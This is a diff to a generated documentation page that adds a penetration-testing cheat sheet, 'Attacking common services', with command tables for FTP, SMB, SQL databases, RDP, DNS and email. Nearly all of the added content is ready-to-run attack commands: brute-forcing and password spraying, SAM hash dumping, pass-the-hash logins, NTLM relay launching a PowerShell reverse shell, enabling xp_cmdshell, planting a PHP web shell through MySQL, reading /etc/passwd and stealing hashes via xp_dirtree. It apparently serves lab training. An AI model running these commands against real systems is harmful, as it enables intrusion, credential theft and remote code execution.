@@ -5740,6 +5740,75 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#attacking-common-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking common services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking common services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacking-ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking FTP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking SMB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-sql-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking SQL Databases
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking RDP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking DNS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-email-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Email Services
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#xss" class="md-nav__link">
     <span class="md-ellipsis">
       XSS
@@ -16888,6 +16957,75 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#attacking-common-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking common services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking common services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacking-ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking FTP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking SMB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-sql-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking SQL Databases
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking RDP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking DNS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-email-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Email Services
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#xss" class="md-nav__link">
     <span class="md-ellipsis">
       XSS
@@ -18711,6 +18849,330 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tr>
 </tbody>
 </table>
+<h2 id="attacking-common-services">Attacking common services</h2>
+<h3 id="attacking-ftp">Attacking FTP</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ftp 192.168.2.142</code></td>
+<td>Connecting to the FTP server using the <code>ftp</code> client.</td>
+</tr>
+<tr>
+<td><code>nc -v 192.168.2.142 21</code></td>
+<td>Connecting to the FTP server using <code>netcat</code>.</td>
+</tr>
+<tr>
+<td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td>
+<td>Brute-forcing the FTP service.</td>
+</tr>
+<tr>
+<td><code>medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121</code></td>
+<td>Brute-forcing the FTP service.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attacking-smb">Attacking SMB</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>smbclient -N -L //10.129.14.128</code></td>
+<td>Null-session testing against the SMB service.</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128</code></td>
+<td>Network share enumeration using <code>smbmap</code>.</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 -r notes</code></td>
+<td>Recursive network share enumeration using <code>smbmap</code>.</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 --download "notes\note.txt"</code></td>
+<td>Download a specific file from the shared folder.</td>
+</tr>
+<tr>
+<td><code>smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"</code></td>
+<td>Upload a specific file to the shared folder.</td>
+</tr>
+<tr>
+<td><code>rpcclient -U'%' 10.10.110.17</code></td>
+<td>Null-session with the <code>rpcclient</code>.</td>
+</tr>
+<tr>
+<td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td>
+<td>Automated enumeratition of the SMB service using <code>enum4linux-ng</code>.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code></td>
+<td>Password spraying against different users from a list.</td>
+</tr>
+<tr>
+<td><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></td>
+<td>Connect to the SMB service using the <code>impacket-psexec</code>.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></td>
+<td>Execute a command over the SMB service using <code>crackmapexec</code>.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></td>
+<td>Enumerating Logged-on users.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></td>
+<td>Extract hashes from the SAM database.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td>
+<td>Use the Pass-The-Hash technique to authenticate on the target host.</td>
+</tr>
+<tr>
+<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td>
+<td>Dump the SAM database using <code>impacket-ntlmrelayx</code>.</td>
+</tr>
+<tr>
+<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;base64 reverse shell&gt;</code></td>
+<td>Execute a PowerShell based reverse shell using <code>impacket-ntlmrelayx</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attacking-sql-databases">Attacking SQL Databases</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td>
+<td>Connecting to the MySQL server.</td>
+</tr>
+<tr>
+<td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30</code></td>
+<td>Connecting to the MSSQL server.</td>
+</tr>
+<tr>
+<td><code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code></td>
+<td>Connecting to the MSSQL server from Linux.</td>
+</tr>
+<tr>
+<td><code>sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h</code></td>
+<td>Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SHOW DATABASES;</code></td>
+<td>Show all available databases in MySQL.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; USE htbusers;</code></td>
+<td>Select a specific database in MySQL.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SHOW TABLES;</code></td>
+<td>Show all available tables in the selected database in MySQL.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SELECT * FROM users;</code></td>
+<td>Select all available entries from the "users" table in MySQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td>
+<td>Show all available databases in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; USE htbusers</code></td>
+<td>Select a specific database in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td>
+<td>Show all available tables in the selected database in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM users</code></td>
+<td>Select all available entries from the "users" table in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE sp_configure 'show advanced options', 1</code></td>
+<td>To allow advanced options to be changed.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE sp_configure 'xp_cmdshell', 1</code></td>
+<td>To enable the xp_cmdshell.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; RECONFIGURE</code></td>
+<td>To be used after each sp_configure command to apply the changes.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; xp_cmdshell 'whoami'</code></td>
+<td>Execute a system command from MSSQL server.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php'</code></td>
+<td>Create a file using MySQL.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; show variables like "secure_file_priv";</code></td>
+<td>Check if the the secure file privileges are empty to read locally stored files on the system.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code></td>
+<td>Read local files in MSSQL.</td>
+</tr>
+<tr>
+<td><code>mysql&gt; select LOAD_FILE("/etc/passwd");</code></td>
+<td>Read local files in MySQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'</code></td>
+<td>Hash stealing using the <code>xp_dirtree</code> command in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'</code></td>
+<td>Hash stealing using the <code>xp_subdirs</code> command in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td>
+<td>Identify linked servers in MSSQL.</td>
+</tr>
+<tr>
+<td><code>sqlcmd&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]</code></td>
+<td>Identify the user and its privileges used for the remote connection in MSSQL.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attacking-rdp">Attacking RDP</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code></td>
+<td>Password spraying against the RDP service.</td>
+</tr>
+<tr>
+<td><code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></td>
+<td>Brute-forcing the RDP service.</td>
+</tr>
+<tr>
+<td><code>rdesktop -u admin -p password123 192.168.2.143</code></td>
+<td>Connect to the RDP service using <code>rdesktop</code> in Linux.</td>
+</tr>
+<tr>
+<td><code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></td>
+<td>Impersonate a user without its password.</td>
+</tr>
+<tr>
+<td><code>net start sessionhijack</code></td>
+<td>Execute the RDP session hijack.</td>
+</tr>
+<tr>
+<td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td>
+<td>Enable "Restricted Admin Mode" on the target Windows host.</td>
+</tr>
+<tr>
+<td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td>
+<td>Use the Pass-The-Hash technique to login on the target host without a password.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attacking-dns">Attacking DNS</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td>
+<td>Perform an AXFR zone transfer attempt against a specific name server.</td>
+</tr>
+<tr>
+<td><code>subfinder -d inlanefreight.com -v</code></td>
+<td>Brute-forcing subdomains.</td>
+</tr>
+<tr>
+<td><code>host support.inlanefreight.com</code></td>
+<td>DNS lookup for the specified subdomain.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attacking-email-services">Attacking Email Services</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>host -t MX microsoft.com</code></td>
+<td>DNS lookup for mail servers for the specified domain.</td>
+</tr>
+<tr>
+<td><code>dig mx inlanefreight.com \| grep "MX" \| grep -v ";"</code></td>
+<td>DNS lookup for mail servers for the specified domain.</td>
+</tr>
+<tr>
+<td><code>host -t A mail1.inlanefreight.htb.</code></td>
+<td>DNS lookup of the IPv4 address for the specified subdomain.</td>
+</tr>
+<tr>
+<td><code>telnet 10.10.110.20 25</code></td>
+<td>Connect to the SMTP server.</td>
+</tr>
+<tr>
+<td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td>
+<td>SMTP user enumeration using the RCPT command against the specified host.</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td>
+<td>Verify the usage of Office365 for the specified domain.</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td>
+<td>Enumerate existing users using Office365 on the specified domain.</td>
+</tr>
+<tr>
+<td><code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code></td>
+<td>Password spraying against a list of users that use Office365 for the specified domain.</td>
+</tr>
+<tr>
+<td><code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code></td>
+<td>Brute-forcing the POP3 service.</td>
+</tr>
+<tr>
+<td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213</code></td>
+<td>Testing the SMTP service for the open-relay vulnerability.</td>
+</tr>
+</tbody>
+</table>
 <h2 id="xss">XSS</h2>
 <table>
 <thead>
@@ -18789,7 +19251,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-20T18:03:15+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-20</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-22T20:08:48+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-22</span></small></br>
 
 
     <small>Created: September 7, 2024 19:13:36</small>
